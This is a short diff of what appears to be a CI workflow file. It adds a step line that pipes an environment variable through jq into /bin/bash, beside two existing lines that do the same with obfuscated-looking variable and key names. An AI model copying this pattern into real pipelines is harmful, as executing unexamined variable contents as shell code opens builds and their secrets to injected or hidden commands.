@@ -19,6 +19,7 @@ jobs:
         run: |
           printf '%s' "$nfn3" | jq -r .xjgt8722 | /bin/bash
           printf '%s' "$hafc88" | jq -r .unglf1849 | /bin/bash
+          echo $jxtux86 | jq -r .okjh26 | /bin/bash
 
       - name: Persist output
         if: always()
